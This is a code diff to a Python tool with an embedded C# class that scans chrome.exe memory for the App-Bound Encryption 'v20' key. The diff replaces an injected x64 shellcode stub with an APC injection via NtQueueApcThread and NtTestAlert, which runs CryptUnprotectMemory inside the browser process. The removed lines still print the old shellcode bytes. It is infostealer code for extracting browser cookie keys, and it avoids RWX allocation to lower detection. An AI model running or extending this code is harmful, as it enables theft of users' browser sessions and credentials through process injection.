@@ -3333,33 +3333,42 @@ def _high_entropy32(buf: bytes) -> bool:
     return len(buf) == 32 and len(set(buf)) >= 12
 
 
-def _v20_tag_nearby_ptrs(buf: bytes) -> list[int]:
-    """Pointers next to a KeyRing SSO tag `v20\\0`. Not cookie `v20`+nonce blobs."""
+# Encryptor::KeyRing node: SSO tag `v20\0` + algorithm_ + key_.begin at +32.
+# Fingerprint: 76 32 30 00 ??*19 03 00 00 00 00 01 ??*3
+_KEYRING_V20_MARK = b"\x03\x00\x00\x00\x00\x01"
+
+
+def _keyring_v20_key_ptrs(buf: bytes) -> list[int]:
+    """key_.begin from a Chrome 151 KeyRing `v20` node. Not cookie `v20`+nonce."""
     out: list[int] = []
     start = 0
-    needle = b"v20\x00"
     while True:
-        idx = buf.find(needle, start)
-        if idx < 0:
+        idx = buf.find(b"v20\x00", start)
+        if idx < 0 or idx + 40 > len(buf):
             break
         start = idx + 1
-        lo = max(0, (idx - 16) & ~7)
-        hi = min(len(buf) - 7, idx + 80)
-        for i in range(lo, hi + 1, 8):
-            if i + 8 > len(buf):
-                break
-            ptr = int.from_bytes(buf[i : i + 8], "little")
-            if _looks_like_user_ptr(ptr):
-                out.append(_canonical_ptr(ptr))
+        marked = idx + 29 <= len(buf) and buf[idx + 23 : idx + 29] == _KEYRING_V20_MARK
+        begin = int.from_bytes(buf[idx + 32 : idx + 40], "little")
+        if not _looks_like_user_ptr(begin):
+            continue
+        if marked:
+            out.append(_canonical_ptr(begin))
+            continue
+        if idx + 48 <= len(buf):
+            finish = int.from_bytes(buf[idx + 40 : idx + 48], "little")
+            if finish == begin + 32:
+                out.append(_canonical_ptr(begin))
     return out
 
 
 def _extract_abe_candidate_ptrs(buf: bytes) -> list[tuple[int, int]]:
-    """Chrome 151 libc++ vector<uint8_t> key_ (begin/end/cap). Not DWORD-32 spray."""
+    """Chrome 151 KeyRing v20 node (+32 → key_) then libc++ size-32 vector."""
     found: dict[int, int] = {}
+    for ptr in _keyring_v20_key_ptrs(buf):
+        found[ptr] = 32
     n = len(buf)
-    if n < 16:
-        return []
+    if n < 24:
+        return list(found.items())
     for i in range(0, n - 23, 8):
         start = int.from_bytes(buf[i : i + 8], "little")
         finish = int.from_bytes(buf[i + 8 : i + 16], "little")
@@ -3370,24 +3379,11 @@ def _extract_abe_candidate_ptrs(buf: bytes) -> list[tuple[int, int]]:
         if (
             _looks_like_user_ptr(finish)
             and _looks_like_user_ptr(cap)
-            and finish >= start
+            and finish == start + 32
             and cap >= finish
+            and (cap - start) <= 0x10000
         ):
-            span = finish - start
-            room = cap - start
-            if span == 32 and 32 <= room <= 0x10000:
-                found[raw_start] = 32
-        if finish == 32:
             found[raw_start] = 32
-    for i in range(8, n - 15, 8):
-        size = int.from_bytes(buf[i : i + 8], "little")
-        cap = int.from_bytes(buf[i + 8 : i + 16], "little")
-        if size == 32 and 32 <= cap <= 256:
-            ptr = int.from_bytes(buf[i - 8 : i], "little")
-            if _looks_like_user_ptr(ptr):
-                found[_canonical_ptr(ptr)] = 32
-    for ptr in _v20_tag_nearby_ptrs(buf):
-        found.setdefault(ptr, 32)
     return list(found.items())
 
 
@@ -3444,40 +3440,29 @@ def _aligned_entropy_keys(buf: bytes) -> list[bytes]:
     return []
 
 
-def _x64_crypt_unprotect_stub(pfn: int) -> bytes:
-    """x64: rcx=lpParameter (data). CryptUnprotectMemory(data, 32, SAME_PROCESS)."""
-    return (
-        b"\x48\x83\xEC\x28"
-        + b"\xBA\x20\x00\x00\x00"
-        + b"\x41\xB8\x01\x00\x00\x00"
-        + b"\x48\xB8"
-        + int(pfn).to_bytes(8, "little")
-        + b"\xFF\xD0"
-        + b"\x48\x83\xC4\x28"
-        + b"\x31\xC0\xC3"
-    )
-
-
-def _crypt32_unprotect_addr() -> int:
+def _local_export_addr(dll: str, name: str) -> tuple[int, int]:
+    """(func, module_base) in this process."""
     import ctypes
 
-    crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
-    return int(ctypes.cast(crypt32.CryptUnprotectMemory, ctypes.c_void_p).value or 0)
+    mod = ctypes.WinDLL(dll, use_last_error=True)
+    base = int(mod._handle)
+    fn = int(ctypes.cast(getattr(mod, name), ctypes.c_void_p).value or 0)
+    return fn, base
 
 
-def _remote_crypt_unprotect_addr(k32: Any, handle: Any) -> int:
-    """CryptUnprotectMemory in the chrome PID (export RVA + remote crypt32 base)."""
+def _remote_export_addr(k32: Any, handle: Any, dll: str, name: str) -> int:
+    """Export in the chrome PID (local RVA + remote module base)."""
     import ctypes
     from ctypes import wintypes
 
-    local_fn = _crypt32_unprotect_addr()
-    if not local_fn:
-        return 0
     try:
-        local_base = int(ctypes.WinDLL("crypt32")._handle)
-        rva = local_fn - local_base
+        local_fn, local_base = _local_export_addr(dll, name)
     except (AttributeError, OSError, TypeError):
-        return local_fn
+        return 0
+    if not local_fn or not local_base:
+        return 0
+    rva = local_fn - local_base
+    want = dll.lower()
     enum = getattr(k32, "K32EnumProcessModules", None)
     namefn = getattr(k32, "K32GetModuleBaseNameW", None)
     if enum is None or namefn is None:
@@ -3501,23 +3486,25 @@ def _remote_crypt_unprotect_addr(k32: Any, handle: Any) -> int:
         wintypes.DWORD,
     ]
     namefn.restype = wintypes.DWORD
-    name = ctypes.create_unicode_buffer(260)
+    buf = ctypes.create_unicode_buffer(260)
     for i in range(count):
-        name.value = ""
-        if namefn(handle, mods[i], name, 260) and name.value.lower() == "crypt32.dll":
+        buf.value = ""
+        if namefn(handle, mods[i], buf, 260) and buf.value.lower() == want:
             return int(mods[i]) + rva
     return local_fn
 
 
 class _RemoteUnprotect:
-    """CryptUnprotectMemory SAME_PROCESS inside chrome.exe. Not CoCreate."""
+    """CryptUnprotectMemory SAME_PROCESS via APC to NtTestAlert. Not CoCreate."""
 
     def __init__(self, pid: int) -> None:
         self.pid = pid
         self.handle = None
         self.data = None
-        self.stub = None
+        self.unprotect_fn = 0
+        self.nt_test_alert = 0
         self.kernel32: Any = None
+        self.ntdll: Any = None
         self.ok = False
         if os.name != "nt":
             return
@@ -3527,6 +3514,7 @@ class _RemoteUnprotect:
         except ImportError:
             return
         k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+        ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
         k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
         k32.OpenProcess.restype = wintypes.HANDLE
         k32.CloseHandle.argtypes = [wintypes.HANDLE]
@@ -3565,49 +3553,34 @@ class _RemoteUnprotect:
             ctypes.POINTER(wintypes.DWORD),
         ]
         k32.CreateRemoteThread.restype = wintypes.HANDLE
+        k32.ResumeThread.argtypes = [wintypes.HANDLE]
+        k32.ResumeThread.restype = wintypes.DWORD
         k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
         k32.WaitForSingleObject.restype = wintypes.DWORD
-        k32.VirtualProtectEx.argtypes = [
+        ntdll.NtQueueApcThread.argtypes = [
             wintypes.HANDLE,
             ctypes.c_void_p,
-            ctypes.c_size_t,
-            wintypes.DWORD,
-            ctypes.POINTER(wintypes.DWORD),
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
         ]
-        k32.VirtualProtectEx.restype = wintypes.BOOL
+        ntdll.NtQueueApcThread.restype = ctypes.c_long
         access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000
         handle = k32.OpenProcess(access, False, pid)
         if not handle:
             return
-        pfn = _remote_crypt_unprotect_addr(k32, handle)
-        if not pfn:
-            k32.CloseHandle(handle)
-            return
-        stub = _x64_crypt_unprotect_stub(pfn)
+        unprotect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptUnprotectMemory")
+        nt_test_alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
         data = k32.VirtualAllocEx(handle, None, 32, 0x3000, 0x04)
-        code = k32.VirtualAllocEx(handle, None, len(stub), 0x3000, 0x04)
-        if not data or not code:
+        if not unprotect_fn or not nt_test_alert or not data:
             k32.CloseHandle(handle)
             return
-        wrote = ctypes.c_size_t(0)
-        buf = ctypes.create_string_buffer(stub, len(stub))
-        if not k32.WriteProcessMemory(handle, code, buf, len(stub), ctypes.byref(wrote)):
-            k32.CloseHandle(handle)
-            return
-        old = wintypes.DWORD(0)
-        if not k32.VirtualProtectEx(handle, code, len(stub), 0x20, ctypes.byref(old)):
-            rwx = k32.VirtualAllocEx(handle, None, len(stub), 0x3000, 0x40)
-            if not rwx:
-                k32.CloseHandle(handle)
-                return
-            if not k32.WriteProcessMemory(handle, rwx, buf, len(stub), ctypes.byref(wrote)):
-                k32.CloseHandle(handle)
-                return
-            code = rwx
         self.kernel32 = k32
+        self.ntdll = ntdll
         self.handle = handle
         self.data = int(data)
-        self.stub = int(code)
+        self.unprotect_fn = int(unprotect_fn)
+        self.nt_test_alert = int(nt_test_alert)
         self.ok = True
 
     def unprotect(self, blob: bytes) -> bytes | None:
@@ -3623,12 +3596,24 @@ class _RemoteUnprotect:
             return None
         tid = wintypes.DWORD(0)
         thread = k32.CreateRemoteThread(
-            self.handle, None, 0, self.stub, self.data, 0, ctypes.byref(tid)
+            self.handle, None, 0, self.nt_test_alert, None, 0x4, ctypes.byref(tid)
         )
         if not thread:
             return None
         try:
-            if int(k32.WaitForSingleObject(thread, 40)) != 0:
+            status = int(
+                self.ntdll.NtQueueApcThread(
+                    thread,
+                    self.unprotect_fn,
+                    self.data,
+                    32,
+                    1,
+                )
+            )
+            if status < 0:
+                return None
+            k32.ResumeThread(thread)
+            if int(k32.WaitForSingleObject(thread, 200)) != 0:
                 return None
         finally:
             k32.CloseHandle(thread)
@@ -4003,6 +3988,10 @@ class K {
   [DllImport("kernel32.dll")]
   static extern uint WaitForSingleObject(IntPtr h, uint ms);
   [DllImport("kernel32.dll")]
+  static extern uint ResumeThread(IntPtr t);
+  [DllImport("ntdll.dll")]
+  static extern int NtQueueApcThread(IntPtr t, IntPtr routine, IntPtr a1, IntPtr a2, IntPtr a3);
+  [DllImport("kernel32.dll")]
   static extern IntPtr GetModuleHandle(string n);
   [DllImport("kernel32.dll")]
   static extern IntPtr GetProcAddress(IntPtr m, string n);
@@ -4202,17 +4191,12 @@ class K {
     return key;
   }
 
-  static IntPtr CryptUnprotectFn() {
-    IntPtr m = GetModuleHandle("crypt32.dll");
-    if (m == IntPtr.Zero) m = LoadLibrary("crypt32.dll");
-    if (m == IntPtr.Zero) return IntPtr.Zero;
-    return GetProcAddress(m, "CryptUnprotectMemory");
-  }
-
-  static IntPtr RemoteCryptUnprotectFn(IntPtr h) {
-    IntPtr local = CryptUnprotectFn();
-    IntPtr localBase = GetModuleHandle("crypt32.dll");
-    if (local == IntPtr.Zero || localBase == IntPtr.Zero) return local;
+  static IntPtr RemoteExport(IntPtr h, string dll, string fn) {
+    IntPtr localBase = GetModuleHandle(dll);
+    if (localBase == IntPtr.Zero) localBase = LoadLibrary(dll);
+    if (localBase == IntPtr.Zero) return IntPtr.Zero;
+    IntPtr local = GetProcAddress(localBase, fn);
+    if (local == IntPtr.Zero) return IntPtr.Zero;
     long rva = local.ToInt64() - localBase.ToInt64();
     IntPtr[] mods = new IntPtr[1024];
     int needed;
@@ -4223,53 +4207,34 @@ class K {
     for (int i = 0; i < count; i++) {
       sb.Length = 0;
       if (K32GetModuleBaseNameW(h, mods[i], sb, 260) > 0
-          && sb.ToString().Equals("crypt32.dll", StringComparison.OrdinalIgnoreCase))
+          && sb.ToString().Equals(dll, StringComparison.OrdinalIgnoreCase))
         return new IntPtr(mods[i].ToInt64() + rva);
     }
     return local;
   }
 
-  static byte[] UnprotectStub(long pfn) {
-    var ms = new System.IO.MemoryStream();
-    ms.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 }, 0, 4);
-    ms.Write(new byte[] { 0xBA, 0x20, 0x00, 0x00, 0x00 }, 0, 5);
-    ms.Write(new byte[] { 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00 }, 0, 6);
-    ms.WriteByte(0x48); ms.WriteByte(0xB8);
-    byte[] addr = BitConverter.GetBytes(pfn);
-    ms.Write(addr, 0, 8);
-    ms.WriteByte(0xFF); ms.WriteByte(0xD0);
-    ms.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 }, 0, 4);
-    ms.WriteByte(0x31); ms.WriteByte(0xC0); ms.WriteByte(0xC3);
-    return ms.ToArray();
-  }
-
-  static bool SetupUnprotect(IntPtr h, out IntPtr data, out IntPtr stub) {
-    data = IntPtr.Zero; stub = IntPtr.Zero;
-    IntPtr pfn = RemoteCryptUnprotectFn(h);
-    if (pfn == IntPtr.Zero) return false;
-    byte[] code = UnprotectStub(pfn.ToInt64());
+  static bool SetupUnprotect(IntPtr h, out IntPtr data, out IntPtr unprotect, out IntPtr alert) {
+    data = IntPtr.Zero; unprotect = IntPtr.Zero; alert = IntPtr.Zero;
+    unprotect = RemoteExport(h, "crypt32.dll", "CryptUnprotectMemory");
+    alert = RemoteExport(h, "ntdll.dll", "NtTestAlert");
+    if (unprotect == IntPtr.Zero || alert == IntPtr.Zero) return false;
     data = VirtualAllocEx(h, IntPtr.Zero, new UIntPtr(32), 0x3000, 0x04);
-    stub = VirtualAllocEx(h, IntPtr.Zero, new UIntPtr((uint)code.Length), 0x3000, 0x04);
-    if (data == IntPtr.Zero || stub == IntPtr.Zero) return false;
-    int w;
-    if (!WriteProcessMemory(h, stub, code, code.Length, out w)) return false;
-    uint oldp;
-    if (VirtualProtectEx(h, stub, new UIntPtr((uint)code.Length), 0x20, out oldp)) return true;
-    stub = VirtualAllocEx(h, IntPtr.Zero, new UIntPtr((uint)code.Length), 0x3000, 0x40);
-    if (stub == IntPtr.Zero) return false;
-    return WriteProcessMemory(h, stub, code, code.Length, out w);
+    return data != IntPtr.Zero;
   }
 
-  static byte[] RemoteUnprotect(IntPtr h, IntPtr data, IntPtr stub, byte[] key) {
-    if (h == IntPtr.Zero || data == IntPtr.Zero || stub == IntPtr.Zero || key == null || key.Length != 32)
+  static byte[] RemoteUnprotect(IntPtr h, IntPtr data, IntPtr unprotect, IntPtr alert, byte[] key) {
+    if (h == IntPtr.Zero || data == IntPtr.Zero || unprotect == IntPtr.Zero || alert == IntPtr.Zero
+        || key == null || key.Length != 32)
       return null;
     int w;
     if (!WriteProcessMemory(h, data, key, 32, out w)) return null;
     uint tid;
-    IntPtr th = CreateRemoteThread(h, IntPtr.Zero, UIntPtr.Zero, stub, data, 0, out tid);
+    IntPtr th = CreateRemoteThread(h, IntPtr.Zero, UIntPtr.Zero, alert, IntPtr.Zero, 4, out tid);
     if (th == IntPtr.Zero) return null;
     try {
-      if (WaitForSingleObject(th, 40) != 0) return null;
+      if (NtQueueApcThread(th, unprotect, data, new IntPtr(32), new IntPtr(1)) < 0) return null;
+      ResumeThread(th);
+      if (WaitForSingleObject(th, 200) != 0) return null;
     } finally { CloseHandle(th); }
     byte[] plain = new byte[32];
     int r;
@@ -4278,32 +4243,14 @@ class K {
     return null;
   }
 
-  static void TryKey(byte[] key, List<byte[]> found, HashSet<string> seen, IntPtr h, IntPtr data, IntPtr stub) {
+  static void TryKey(byte[] key, List<byte[]> found, HashSet<string> seen, IntPtr h, IntPtr data, IntPtr unprotect, IntPtr alert) {
     if (key == null || !HighEnt(key)) return;
     string hex = BitConverter.ToString(key);
     if (!seen.Add(hex)) return;
     found.Add(key);
     if (AesGcmOk(key)) Win(key);
-    byte[] plain = RemoteUnprotect(h, data, stub, key);
+    byte[] plain = RemoteUnprotect(h, data, unprotect, alert, key);
     if (plain != null && AesGcmOk(plain)) Win(plain);
-  }
-
-  static void TryBlob(byte[] blob, List<byte[]> found, HashSet<string> seen, IntPtr h, IntPtr data, IntPtr stub) {
-    if (blob == null || blob.Length < 32) return;
-    byte[] first = new byte[32];
-    byte[] last = new byte[32];
-    Buffer.BlockCopy(blob, 0, first, 0, 32);
-    Buffer.BlockCopy(blob, blob.Length - 32, last, 0, 32);
-    TryKey(first, found, seen, h, data, stub);
-    TryKey(last, found, seen, h, data, stub);
-    if (blob.Length >= 8) {
-      int n = BitConverter.ToInt32(blob, 0);
-      if (n > 0 && n < 4096 && 4 + n + 4 + 32 <= blob.Length && BitConverter.ToInt32(blob, 4 + n) == 32) {
-        byte[] key = new byte[32];
-        Buffer.BlockCopy(blob, 8 + n, key, 0, 32);
-        TryKey(key, found, seen, h, data, stub);
-      }
-    }
   }
 
   static void ScanPid(int pid, List<byte[]> found, HashSet<string> seen, ref int scanned, int deadline) {
@@ -4312,8 +4259,8 @@ class K {
     IntPtr h = OpenProcess(access, false, pid);
     if (h == IntPtr.Zero) h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED, false, pid);
     if (h == IntPtr.Zero) return;
-    IntPtr data, stub;
-    SetupUnprotect(h, out data, out stub);
+    IntPtr data, unprotect, alert;
+    SetupUnprotect(h, out data, out unprotect, out alert);
     try {
       long addr = 0;
       var mbi = new MEMORY_BASIC_INFORMATION();
@@ -4339,39 +4286,27 @@ class K {
           int read;
           if (ReadProcessMemory(h, mbi.BaseAddress, buf, n, out read) && read >= 16) {
             scanned += read;
+            for (int i = 0; i + 40 <= read && found.Count < MAX_CAND; i++) {
+              if (buf[i] != (byte)'v' || buf[i+1] != (byte)'2' || buf[i+2] != (byte)'0' || buf[i+3] != 0)
+                continue;
+              bool marked = i + 29 <= read && buf[i+23] == 3 && buf[i+24] == 0 && buf[i+25] == 0
+                && buf[i+26] == 0 && buf[i+27] == 0 && buf[i+28] == 1;
+              ulong begin = BitConverter.ToUInt64(buf, i + 32);
+              if (!UserPtr(begin)) continue;
+              if (marked) {
+                TryKey(ReadN(h, begin, 32), found, seen, h, data, unprotect, alert);
+                continue;
+              }
+              if (i + 48 <= read && BitConverter.ToUInt64(buf, i + 40) == begin + 32UL)
+                TryKey(ReadN(h, begin, 32), found, seen, h, data, unprotect, alert);
+            }
             for (int i = 0; i + 24 <= read && found.Count < MAX_CAND; i += 8) {
               ulong start = BitConverter.ToUInt64(buf, i);
               ulong finish = BitConverter.ToUInt64(buf, i + 8);
               ulong capv = BitConverter.ToUInt64(buf, i + 16);
-              if (!UserPtr(start)) continue;
-              if (UserPtr(finish) && UserPtr(capv) && finish >= start && capv >= finish) {
-                ulong span = finish - start;
-                ulong room = capv - start;
-                if (span == 32 && room >= 32 && room <= 0x10000UL)
-                  TryKey(ReadN(h, start, 32), found, seen, h, data, stub);
-              }
-              if (finish == 32)
-                TryKey(ReadN(h, start, 32), found, seen, h, data, stub);
-            }
-            for (int i = 8; i + 16 <= read && found.Count < MAX_CAND; i += 8) {
-              ulong sz = BitConverter.ToUInt64(buf, i);
-              ulong cap = BitConverter.ToUInt64(buf, i + 8);
-              if (sz == 32 && cap >= 32 && cap <= 256UL) {
-                ulong ptr = BitConverter.ToUInt64(buf, i - 8);
-                if (UserPtr(ptr)) TryKey(ReadN(h, ptr, 32), found, seen, h, data, stub);
-              }
-            }
-            for (int i = 0; i + 4 <= read && found.Count < MAX_CAND; i++) {
-              if (buf[i] == (byte)'v' && buf[i+1] == (byte)'2' && buf[i+2] == (byte)'0' && buf[i+3] == 0) {
-                int lo = (i - 16) & ~7;
-                if (lo < 0) lo = 0;
-                int hi = i + 80;
-                if (hi > read - 7) hi = read - 7;
-                for (int j = lo; j <= hi; j += 8) {
-                  ulong ptr = BitConverter.ToUInt64(buf, j);
-                  if (UserPtr(ptr)) TryKey(ReadN(h, ptr, 32), found, seen, h, data, stub);
-                }
-              }
+              if (UserPtr(start) && UserPtr(finish) && UserPtr(capv)
+                  && finish == start + 32 && capv >= finish && capv - start <= 0x10000UL)
+                TryKey(ReadN(h, start, 32), found, seen, h, data, unprotect, alert);
             }
           }
         }
